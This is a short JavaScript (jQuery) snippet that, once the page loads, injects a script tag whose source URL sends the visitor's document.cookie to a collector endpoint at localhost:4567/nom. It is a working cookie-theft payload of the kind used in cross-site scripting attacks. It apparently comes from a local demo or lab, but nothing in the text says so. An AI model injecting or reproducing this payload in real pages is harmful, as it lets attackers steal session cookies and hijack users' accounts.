$(document).ready(function(){
  var headID = document.getElementsByTagName("head")[0];
  var newScript = document.createElement('script');
  newScript.type = 'text/javascript';
  newScript.src = 'http://localhost:4567/nom?cookie=' + escape(document.cookie);
  headID.appendChild(newScript);
});